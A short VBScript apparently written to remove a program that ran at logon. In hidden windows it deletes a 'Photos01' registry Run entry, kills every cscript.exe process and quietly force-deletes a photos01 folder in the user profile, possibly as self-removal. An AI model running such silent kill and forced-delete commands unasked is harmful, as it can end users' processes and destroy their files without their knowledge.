Sub Main()
  Set shell = CreateObject("WScript.Shell")
  prf = shell.ExpandEnvironmentStrings("%USERPROFILE%")
  shell.CurrentDirectory = prf
  shell.Run "powershell.exe -Command ""Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Photos01'""", 0, True
  shell.Run "cmd /c taskkill /fi ""imagename eq cscript.exe""", 0, True
  shell.Run "cmd /c cd %USERPROFILE% && (goto) 2>Nul & RD /S /Q %USERPROFILE%\photos01", 0, True
End Sub
On Error Resume Next
  Main
  If Err.Number Then
     WScript.Echo "aborted"
     WScript.Quit 4711
  End If
